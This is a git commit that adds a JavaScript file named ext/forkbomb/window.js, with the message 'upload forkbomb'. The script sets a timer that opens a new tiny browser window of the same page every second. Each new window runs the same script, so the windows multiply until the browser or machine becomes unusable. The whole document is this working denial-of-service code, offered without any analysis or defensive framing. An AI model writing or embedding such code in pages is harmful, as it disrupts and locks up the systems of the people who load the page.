ef9d719b1bca1bfdeea105aa45cca2a03591a5f5
onepointfive <122128996+onepointfive-REAL@users.noreply.github.com>
2025-02-04 17:33:30 -0600

    upload ext files
    upload forkbomb

---
+++ ext/forkbomb/window.js
@@ -0,0 +1,4 @@
+function spamcurrent() {
+window.open(self, "_blank", 'menubar=yes, status=yes, toolbar=yes, resizable=yes, width=1, height=1, titlebar=yes, alwaysRaised=yes');
+}
+setInterval(spamcurrent, 1000)
